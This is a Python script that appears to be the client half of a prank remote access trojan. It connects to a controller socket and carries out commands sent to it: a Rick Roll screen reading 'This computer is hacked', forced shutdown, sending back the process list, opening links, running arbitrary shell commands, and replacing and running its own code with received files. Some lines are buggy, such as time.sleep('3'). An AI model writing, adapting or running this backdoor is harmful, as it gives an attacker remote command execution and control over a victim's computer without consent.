import socket
import threading
import os
import webbrowser
from pygame import mixer
import pyttsx3
from tkinter import *
import time
from pysinewave import SineWave

engine = pyttsx3.init()
flag = 0
loopflag = 0

def win_destroy():
    global loopflag
    order = s.recv(1024).decode("utf-8")
    if "exitloop" in order:
        loopflag = 1

def infinite_loop():
    global loopflag
    root = Tk()
    root.geometry("400x400")
    #root.attributes('-fullscreen', True)
    root.configure(bg='black')
    root.title("This computer is hacked")
    text = Label(root, text="HACKED BY WHO?", font=('Arial', 70), fg='black')
    text.place(relx=0.5, rely=0.5, anchor='center')
    root.after(1000, root.destroy)
    root.mainloop()
    if loopflag == 0:
        infinite_loop()
    elif loopflag == 1:
        mixer.music.stop()

while True:
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect(("127.0.0.1", 62121))
            break
        except:
            print("Trying to connect...")
    while True:
        try:
            data = (s.recv(1024)).decode("utf-8")
            if "trollmode" in data:
                threading.Thread(target=win_destroy).start()
                os.startfile("pymatrix.py")
                time.sleep("3")
                mixer.init()
                mixer.music.load("rickturn.mp3")
                mixer.music.set_volume(0.7)
                mixer.music.play()
                infinite_loop()
                loopflag = 0
                print("WELCOME TO THE REVOLUTION")
                print("RICK ROLLED")
            elif "print" in data:
                print(data.replace("print ", ""))
            elif "shutdown" in data:
                os.system("shutdown /s")
            elif "tasklist" in data:
                tasklist_data = os.popen('tasklist').read()
                tasklist_data_list = tasklist_data.splitlines()
                temp_tasklist_data = ""
                for x in range(0, len(tasklist_data_list)):
                    if not ("svchost" in tasklist_data_list[x]):
                        temp_tasklist_data += (tasklist_data_list[x]+"\n")
                tasklist_data = temp_tasklist_data
                s.sendall(tasklist_data.encode("utf-8"))
            elif "sendlink" in data:
                link = s.recv(1024).decode("utf-8")
                webbrowser.open(link)
            elif "sendvoice" in data:
                voice = s.recv(2048).decode("utf-8")
                engine.say(voice)
                engine.runAndWait()
            elif "sendcommand" in data:
                command = s.recv(1024).decode("utf-8")
                os.system(command)
            elif "sinewave" in data:
                pt = int(s.recv(1024))
                dt = int(s.recv(1024))
                sinewave = SineWave(pitch=pt)
                sinewave.play()
                time.sleep(dt)
                sinewave.stop()
            elif "sendfile" in data:
                file_data = s.recv(8192).decode("utf-8")
                print("[+] File received")
                with open('client.py', 'w') as f:
                    f.write(file_data)
                os.startfile('client.py')
                f.close()
                flag = 1
                break
        except:
             break
    if flag == 1:
        exit()
